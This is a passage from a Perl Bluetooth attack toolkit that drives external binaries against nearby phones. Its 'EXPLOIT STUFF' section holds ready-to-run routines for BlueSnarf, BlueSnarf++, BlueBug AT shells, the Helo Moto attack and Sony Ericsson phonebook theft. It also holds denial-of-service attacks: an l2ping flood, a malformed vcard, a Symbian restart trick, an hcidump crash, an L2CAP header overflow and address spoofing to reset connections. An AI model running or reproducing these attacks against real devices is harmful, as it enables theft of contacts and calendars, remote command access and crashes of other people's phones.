        if($name =~ /0x[\w]+/)
        {
	   print "<<< Setting device type to $name\n";
	   system("$cfg->{'hciconfig'} $preferences{'device'} class $hex");
        }
        else
        {
	   print "<<< Unsupported device type\n";
        }
    }
    else
    {
	print "<<< Setting device type to $name\n";
	system("$cfg->{'hciconfig'} $preferences{'device'} class $hex");
    }
}

# Set device visibility
sub set_device_visibility
{
    # Unvisible
    if($preferences{'device_visibility'} == 0)
    {
	print "<<< Setting device to non-visible mode\n";
	system("$cfg->{'hciconfig'} $preferences{'device'} noscan");
    }
    
    # Visible
    elsif($preferences{'device_visibility'} == 1)
    {
	print "<<< Setting device to visible mode\n";
	system("$cfg->{'hciconfig'} $preferences{'device'} piscan");
    }
}


###[ EXPLOIT STUFF ]###

# Blue Snarf attack
sub bluesnarf
{
    $devicedir = $preferences{'logdir'} . $target;
    
    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    $preferences{'channel'} = get_channel($target,"OBEX Object Push");

    if($loop_mode)
    {
       $preferences{'channel'} = 6 if ($preferences{'channel'} == 0) || ($preferences{'channel'} eq "");
    }
    else
    {
       ask_channel() if ($preferences{'channel'} == 0) || ($preferences{'channel'} eq "");
    }                  

    unlink("$devicedir/phonebook") if -e ("$devicedir/phonebook");
    unlink("$devicedir/calendar") if -e ("$devicedir/calendar");
    
    print "<<< Bluesnarfing $target (" . $seen{$target}->{'host'} . " " . $seen{$target}->{'type'} . ")\n";
    system("$cfg->{'btobex'} pb $target $preferences{'channel'} > $devicedir/phonebook");
    system("$cfg->{'btobex'} cal $target $preferences{'channel'} > $devicedir/calendar");
    
    die "FATAL! $devicedir/phonebook is a symbolic link!\n" if -l ("$devicedir/phonebook");
    open(IN,"<$devicedir/phonebook");
    my @input = <IN>;
    close(IN);
    
    if(scalar(@input) == 0)
    {
	print "<<< No phonebook received.\n";
    }
    else
    {
	map{ print; } @input;
    }
    
    die "FATAL! $devicedir/calendar is a symbolic link!\n" if -l ("$devicedir/calendar");
    open(IN,"<$devicedir/calendar");
    my @input = <IN>;
    close(IN);
    
    if(scalar(@input) == 0)
    {
	print "<<< No calendar received.\n";
    }
    else
    {
	map{print;}@input;
    }

    &{$last_menu} unless $no_menu or $loop_mode;
}

# Blue Snarf++
sub bluesnarf2
{
    $devicedir = $preferences{'logdir'} . $target;
    $preferences{'channel'} = 10;
    
    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    $preferences{'channel'} = get_channel($target,"OBEX Object Push");

    if($loop_mode)
    {
        $preferences{'channel'} = 6 if $preferences{'channel'} == 0;
    }
    else
    {
       ask_channel() if $preferences{'channel'} == 0;
    }
    print "<<< Launching BlueSnarf++ on $target (" . $seen{$target}->{'host'} . " " . $seen{$target}->{'type'} . ") channel $preferences{'channel'}\n";
    system("$cfg->{'btftp'} $target $preferences{'channel'}");
    &{$last_menu} unless $no_menu or $loop_mode;
}

# Blue Bug
sub bluebug
{
    $devicedir = $preferences{'logdir'} . $target;
    
    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    if($loop_mode)
    {
       $preferences{'channel'} = 17 if $preferences{'channel'} == 0;
    }
    else
    {
       ask_channel();
    }

    unlink("$devicedir/phonebook") if -e ("$devicedir/phonebook");
    print "Bluebugging $target (" . $seen{$target}->{'host'} . " " . $seen{$target}->{'type'} . ") on $preferences{'channel'}\n";
    system("$cfg->{'attest'} $target $preferences{'channel'} > $devicedir/phonebook");
    
    die "FATAL! $devicedir/phonebook is a symbolic link!\n" if -l ("$devicedir/phonebook");
    open(IN,"<$devicedir/phonebook");
    my @input = <IN>;
    close(IN);
    
    if(scalar(@input) == 0)
    {
	print "<<< No phonebook received.\n";
    }
    else
    {
	map{ print; } @input;
    }

    &{$last_menu} unless $no_menu or $loop_mode;
}

# Get a BlueBug AT Shell
sub bluebug_atshell
{
    $devicedir = $preferences{'logdir'} . $target;

    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    ask_channel();
    print "<<< Trying to get a BlueBug AT shell on $target (" . $seen{$target}->{'host'} . " " . $seen{$target}->{'type'} . ") channel $preferences{'channel'}\n";
    system("$cfg->{'atshell'} $target $preferences{'channel'}");
    &{$last_menu} unless $no_menu or $loop_mode;
}

# Blue Smack
sub bluesmack
{
    $devicedir = $preferences{'logdir'} . $target;
    
    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    print "<<< Bluesmacking $target (" . $seen{$target}->{'host'} . " " . $seen{$target}->{'type'} . ")\n";
    system("$cfg->{'l2ping'} -f -s 667 $target >/dev/null \&");
    &{$last_menu} unless $no_menu or $loop_mode;
}

# Stop Bluesmack attack
sub stop_bluesmack
{
    system("killall l2ping 2> /dev/null");
    &{$last_menu} unless $no_menu;
}

# Try to dos the device by sending a nasty vcard
sub send_nasty_vcard
{
    $devicedir = $preferences{'logdir'} . $target;
    
    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    print "<<< Sending a nasty vcard to $target (" . $seen{$target}->{'host'} . " " . $seen{$target}->{'type'} . ")\n";
    system("$cfg->{'btobex'} push $target $preferences{'vcard'}");
    &{$last_menu} unless $no_menu or $loop_mode;
}

# Helo moto attack (motorola)
sub helomoto
{
    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    $preferences{'channel'} = get_channel($target,"OBEX Object Push");

    if($loop_mode)
    {
       $preferences{'channel'} = 6 if $preferences{'channel'} == 0;
    }
    else
    {
       ask_channel() if ($preferences{'channel'} == 0) || ($preferences{'channel'} eq "");
    }

    print "<<< Launching Helo Moto attack on $target (" . $seen{$target}->{'host'} . " " . $seen{$target}->{'type'} . ") channel $preferences{'channel'}\n";
    print "<<< Opening RFCOMM connection to $target:$preferences{'channel'}\n";
    system("$cfg->{'rfcomm'} -i $preferences{'device'} connect $rfcomm_device $target $preferences{'channel'} &");	
    sleep 2;
    print "<<< Trying to launch AT shell on channel 3\n";
    system("$cfg->{'atshell'} $target 3");	
    print "Closing RFCOMM connection.\n";
    system("$cfg->{'rfcomm'} -i $preferences{'device'} release $rfcomm_device");
    &{$last_menu} unless $no_menu or $loop_mode;
}

# Blue Snarf an ericsson phone
sub bluesnarf_ericsson
{
    $devicedir = $preferences{'logdir'} . $target;
    
    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    unlink("$devicedir/phonebook") if -e ("$devicedir/phonebook");
    print "<<< Bluesnarfing $target (" . $seen{$target}->{'host'} . " " . get_device_type_by_id($seen{$target}->{'class'}) . ") - sony ericsson mode\n";
    system("$cfg->{'obexftp'} -b $target -B 10 -g telecom/pb.vcf > $devicedir/phonebook");
    
    die "FATAL! $devicedir/phonebook is a symbolic link!\n" if -l ("$devicedir/phonebook");
    open(IN,"<$devicedir/phonebook");
    my @input = <IN>;
    close(IN);
    
    if(scalar(@input) == 0)
    {
	unlink("$devicedir/phonebook") if -e ("$devicedir/phonebook");
	system("$cfg->{'attest'} $target 17 > $devicedir/phonebook");
	
	die "FATAL! $devicedir/phonebook is a symbolic link!\n" if -l ("$devicedir/phonebook");
	open(IN,"<$devicedir/phonebook");
	my @input = <IN>;
	close(IN);
	
	if(scalar(@input) == 0)
	{
	    print "<<< No phonebook received.\n";
	}
	else
	{
	    map{print;}@input;
	}
    }
    else
    {
	map{print;}@input;
    }

    &{$last_menu} unless $no_menu or $loop_mode;
}

# A Symbian OS restarts if it gets in touch with a device
# name including a 090a in hex
sub symbian_remote_restart
{
    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    my $oldname = get_device_name();
    set_device_name($oldname . "\x09\x0a");
    print "<<< Launching Symbian Remote Restart attack on $target (" . $seen{$target}->{'host'} . " " . $seen{$target}->{'type'} . ")\n";
    check_connection();
    sleep 1;
    check_connection();
    set_device_name($oldname);
    &{$last_menu} unless $no_menu or $loop_mode;
}


# Crash remote hcidump < 1.30
sub hcidump_crash
{
    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    system("$cfg->{'hcidump_crash'} $target");
    &{$last_menu} unless $no_menu or $loop_mode;
}

# Crash some phones sending a L2CAP packet with smaller header size
# than packet size
sub l2cap_headersize_overflow
{
    if($target eq "")
    {
	print "<<< I need a target.\n";
	$no_menu = 1;
	get_a_target();
	$no_menu = 0;
    }

    print "<<< Sending L2CAP packet with too small header size to $target (" . $seen{$target}->{'host'} . " " . $seen{$target}->{'type'} . ")\n";
    system("$cfg->{'l2cap_headersize_overflow'} $target");
    &{$last_menu} unless $no_menu or $loop_mode;
}

# Reset a Bluetooth connection by spoofing an address and sending
# a L2CAP command rej packet
sub reset_connection_via_l2cap_command_rej
{
    my ($spoof, $reject);

    print "<<< Tell me the address I shall spoof:\n";

    $no_menu = 1;
    get_a_target();
    $spoof = $target;

    print "<<< Address to send reject packet to:\n";

    get_a_target();
    $no_menu = 0;
    $reject = $target;

    # Save old btaddr!
    my $old_addr = get_device_address();

    if($old_addr eq "unknown")
    {
    	print "<<< Local address unknown! Aborting...\n";
    }
    else
    {
    	# Spoof address
        $no_menu = 1;
        change_btaddr($spoof);
        sleep(3);
    
        # Send L2CAP COMMAND_REJ packet
        print "<<< Sending L2CAP COMMAND_REJ packet to $target (" . $seen{$target}->{'host'} . " " . $seen{$target}->{'type'} . ")\n";
#        system("l2ping -c 1 $reject"); # this would also reset because of the address dub
        system("$cfg->{'l2cappacket'} -a $reject -c 1");

        # Restore original btaddr
        print "<<< Restoring old bluetooth address\n";
        change_btaddr($old_addr);
        $no_menu = 0;
    }

    &{$last_menu} unless $no_menu or $loop_mode;
}



###[ HARMLESS SUBROUTINES ]###

# Check filenames
sub check_preferences
{
    die "Check logdir.\n" unless $preferences{'logdir'} =~ /[a-zA-Z0-9\/]/g;
    die "Check logfile.\n" unless $preferences{'logfile'} =~ /[a-zA-Z0-9\/\.]/g;
    die "Check sound file.\n" unless $preferences{'sound_file'} =~ /[a-zA-Z0-9\/\.]/g;
    die "Check raw file.\n" unless $preferences{'raw_file'} =~ /[a-zA-Z0-9\/\.]/g;
    die "Check channel.\n" unless $preferences{'channel'} =~ /^\d+$/;
    die "Check device name.\n" unless $preferences{'device_name'} =~ /[a-zA-Z0-9]/g;
    $preferences{'loop_timeout'} = 5 unless $preferences{'loop_timeout'} =~ /\d+/;
}

# Print out the main logfile
sub print_logfile
{
    die "FATAL! $preferences{'logfile'} is a symbolic link!\n" if -l $preferences{'logfile'};
    open(IN,"<$preferences{'logfile'}") or die "Cannot read $preferences{'logfile'}!\n";    
    while(<IN>) { print; }
    close(IN);
}

# Change preferences
sub change_preferences
{
    my $oldlogfile = $preferences{'logfile'};
    my $olddevicename = $preferences{'device_name'};
    my $olddevicetype = $preferences{'device_type'};
    my $olddevicevisibility = $preferences{'device_visibility'};

    while(my ($key,$value) = each %preferences)
    {
	print "$key: $value\n";
	print "Change it? <y/N>: ";
	my $input = <STDIN>;
	chomp $input;

	if($input eq "y")
	{
	    print ">>> ";
	    $input = <STDIN>;
	    chomp $input;
	    $preferences{$key} = $input;
	}
    }

    check_preferences();

    if($preferences{'logfile'} ne $oldlogfile)
    {
	close(LOG);
	unlink($preferences{'logfile'}) if -l $preferences{'logfile'};
	open(LOG,">>$preferences{'logfile'}") or die "Cannot write to $preferences{'logfile'}!\n$!\n";
    }

    if($preferences{'device_name'} ne $olddevicename)
    {
	set_device_name($preferences{'device_name'});
    }

    if(lc($preferences{'device_type'}) ne lc($olddevicetype))
    {
	set_device_type($preferences{'device_type'});
    }

    if($preferences{'device_visibility'} != $olddevicevisibility)
    {
	set_device_visibility();
    }

    &{$last_menu};
}

# Show preferences
sub show_preferences
{
    print "<<< Current settings are:\n\n";

    while(my ($key,$value) = each %preferences)
    {
	print "$key: $value\n";
    }

    &{$last_menu};
}

# Initialize everything we need
sub init_program
{
    # Got r00t?
    die "You should have EUID 0 to use this tool.\n" if($> != 0);

    # Dont buffer STDOUT
    $| = 1;

    # Check filenames
    check_preferences();

    # Check binaries
    die "Missing or non-executable binary hciconfig $cfg->{'hciconfig'}.\n" unless -x $cfg->{'hciconfig'};
    die "Missing or non-executable binary hcitool $cfg->{'hcitool'}.\n" unless -x $cfg->{'hcitool'};
    die "Missing or non-executable binary sdptool $cfg->{'sdptool'}.\n" unless -x $cfg->{'sdptool'};
    die "Missing or non-executable binary l2ping $cfg->{'l2ping'}.\n" unless -x $cfg->{'l2ping'};
    die "Missing or non-executable binary rfcomm $cfg->{'rfcomm'}.\n" unless -x $cfg->{'rfcomm'};
    die "Missing or non-executable binary rfcomm_shell $cfg->{'rfcomm_shell'}.\n" unless -x $cfg->{'rfcomm_shell'};
    die "Missing or non-executable binary btobex $cfg->{'btobex'}.\n" unless -x $cfg->{'btobex'};
    die "Missing or non-executable binary btftp $cfg->{'btftp'}.\n" unless -x $cfg->{'btftp'};
    die "Missing or non-executable binary hstest $cfg->{'hstest'}.\n" unless -x $cfg->{'hstest'};
    die "Missing or non-executable binary attest $cfg->{'attest'}.\n" unless -x $cfg->{'attest'};
    die "Missing or non-executable binary atshell $cfg->{'atshell'}.\n" unless -x $cfg->{'atshell'};
    die "Missing or non-executable binary obexftp $cfg->{'obexftp'}.\n" unless -x $cfg->{'obexftp'};
    die "Missing or non-executable binary change_btaddr $cfg->{'change_btaddr'}.\n" unless -x $cfg->{'change_btaddr'};
    die "Missing or non-executable binary redfang $cfg->{'redfang'}.\n" unless -x $cfg->{'redfang'};
    die "Missing or non-executable binary greenplaque $cfg->{'greenplaque'}.\n" unless -x $cfg->{'greenplaque'};
    die "Missing or non-executable binary carwhisperer $cfg->{'carwhisperer'}.\n" unless -x $cfg->{'carwhisperer'};
    die "Missing or non-executable binary bss $cfg->{'bss'}.\n" unless -x $cfg->{'bss'};
    die "Missing or non-executable binary bccmd $cfg->{'bccmd'}.\n" unless -x $cfg->{'bccmd'};
    die "Missing or non-executable binary l2cap-packet $cfg->{'l2cappacket'}.\n" unless -x $cfg->{'l2cappacket'};
    die "Missing or non-executable binary hcidump-crash $cfg->{'hcidump_crash'}.\n" unless -x $cfg->{'hcidump_crash'};
    die "Missing or non-executable binary l2cap_headersize_overflow $cfg->{'l2cap_headersize_overflow'}.\n" unless -x $cfg->{'l2cap_headersize_overflow'};

    if($preferences{'play_sound'})
    {
        die "Missing or non-executable binary play $cfg->{'play'}.\n" unless -x $cfg->{'play'};
        die "Missing or non-executable binary mpg123 $cfg->{'mpg123'}.\n" unless -x $cfg->{'mpg123'};
        die "Missing or non-executable binary sox $cfg->{'sox'}.\n" unless -x $cfg->{'sox'};
    }

    # Is the device up and running?
    system("$cfg->{'hciconfig'} $preferences{'device'} up");
    open(HCI,"$cfg->{'hciconfig'} $preferences{'device'} |") or die "$cfg->{'hciconfig'} $preferences{'device'} up failed!\n$!\n";
    my @hci_check = <HCI>;    
    close(HCI);
    die "$cfg->{'hciconfig'} $preferences{'device'} up failed!\nCheck if your device is plugged in and that all drivers are installed correctly!\n" if scalar(@hci_check) == 0;

    # Set the device name
    set_device_name($preferences{'device_name'});
    
    # Set the device type
    set_device_type($preferences{'device_type'});

    # Set device visibility
    set_device_visibility();

    # Check if logdir exists    
    mkdir($preferences{'logdir'}) unless(-d $preferences{'logdir'});

    # Open logfile
    unlink($preferences{'logfile'}) if -l $preferences{'logfile'};
    open(LOG,">>$preferences{'logfile'}") or die "Cannot write to $preferences{'logfile'}!\n$!\n";

    # Parse vendor map
    print "<<< Parsing vendor map... ";
    open(DB, "<db/oui.txt") or die "Failed! Cannot read vendor db file db/oui.txt!\n$!\n";

    while(<DB>)
    {
       if($_ =~ /(\w\w\-\w\w\-\w\w)\s+\(hex\)\s+(.+)/g)
       {
           my $addr = $1;
           my $vendor = $2;

           $addr =~ s/-/:/g;
           $vendor_map{$addr} = $vendor;
       }
    }

    close(DB);
    print "Done.\n\n";
}

# Just clean up and exit
sub exit_program
{
    $no_menu = 1;
    stop_bluesmack();
    system("$cfg->{'rfcomm'} -i $preferences{'device'} release all");
    system("$cfg->{'hciconfig'} $preferences{'device'} reset");
    close(LOG);
    exit(0);
}

# EOF dude.